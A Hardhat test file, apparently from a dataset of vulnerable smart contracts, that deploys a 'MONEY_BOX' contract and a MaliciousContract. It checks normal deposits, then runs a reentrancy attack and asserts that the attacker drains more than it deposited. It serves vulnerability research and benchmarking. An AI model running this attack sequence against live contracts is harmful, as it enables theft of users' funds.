const { expect } = require("chai");
const { ethers } = require("hardhat");
const path = require("path");
const fs = require("fs");
describe("Reentrancy Attack for 0xbe4041d55db380c5ae9d4a9b9703f1ed4e7e3888.sol", function () {
  let MONEY_BOX;
  let victim;
  let MaliciousContract;
  let hacker;
  let Log;
  let log;

  beforeEach(async function () {
    // Deploy Log contract
    const logPath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/reentrancy/0xbe4041d55db380c5ae9d4a9b9703f1ed4e7e3888.sol/Log.json",
    );
    const logJson = JSON.parse(fs.readFileSync(logPath));
    Log = await ethers.getContractFactory(logJson.abi, logJson.bytecode);
    log = await Log.deploy();
    await log.waitForDeployment();

    // Deploy MONEY_BOX contract with Log address
    const codePath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/reentrancy/0xbe4041d55db380c5ae9d4a9b9703f1ed4e7e3888.sol/MONEY_BOX.json",
    );
    const json = JSON.parse(fs.readFileSync(codePath));
    MONEY_BOX = await ethers.getContractFactory(json.abi, json.bytecode);
    victim = await MONEY_BOX.deploy();
    await victim.waitForDeployment();
    victim.SetLogFile(log.target);

    // Deploy MaliciousContract with MONEY_BOX address
    MaliciousContract = await ethers.getContractFactory(
      "contracts/reentrancy/0xbe4041d55db380c5ae9d4a9b9703f1ed4e7e3888_attack.sol:MaliciousContract",
    );
    hacker = await MaliciousContract.deploy(victim.target);
  });

  it("functional check: reentrancy/0xbe4041d55db380c5ae9d4a9b9703f1ed4e7e3888.sol", async function () {
    const [v, a] = await ethers.getSigners();
    const amount = ethers.parseEther("10");
    await expect(victim.connect(a).Put(0, { value: amount })).to.not.be
      .reverted;
    expect(await ethers.provider.getBalance(victim.target)).to.equal(amount);
    const balanceBefore = await ethers.provider.getBalance(a.address);
    const tx = await victim.connect(a).Collect(amount);
    const receipt = await tx.wait();
    const gasFee = receipt.gasUsed * receipt.gasPrice;
    expect(await ethers.provider.getBalance(victim.target)).to.equal(0);
    expect(await ethers.provider.getBalance(a.address)).to.equal(
      balanceBefore + amount - gasFee,
    );
  });

  it("should successfully drain funds through reentrancy attack", async function () {
    // Initial deposit to victim contract
    await victim.Put(0, { value: ethers.parseEther("5") });

    const victimInitialBalance = await ethers.provider.getBalance(
      victim.target,
    );
    expect(victimInitialBalance).to.equal(ethers.parseEther("5"));

    // Initial deposit from maliciousContract on victim contract
    await hacker.deposit({ value: ethers.parseEther("5") });

    const victimBalanceAfterDeposit = await ethers.provider.getBalance(
      victim.target,
    );
    expect(victimBalanceAfterDeposit).to.equal(ethers.parseEther("10"));

    //set hacker balance to 0
    await network.provider.send("hardhat_setBalance", [hacker.target, "0x0"]);
    let hackerBalance = await ethers.provider.getBalance(hacker.target);
    expect(hackerBalance).to.equal(0);

    // Perform reentrancy attack through MaliciousContract
    await hacker.attack(ethers.parseEther("3"));

    // Check balances after attack
    const victimBalance = await ethers.provider.getBalance(victim.target);
    const maliciousContractBalance = await ethers.provider.getBalance(
      hacker.target,
    );

    // Verify the attack was successful

    expect(victimBalance).to.be.below(ethers.parseEther("5"));

    // hacker has more than the deposited
    expect(maliciousContractBalance).to.be.above(ethers.parseEther("5"));
  });
});
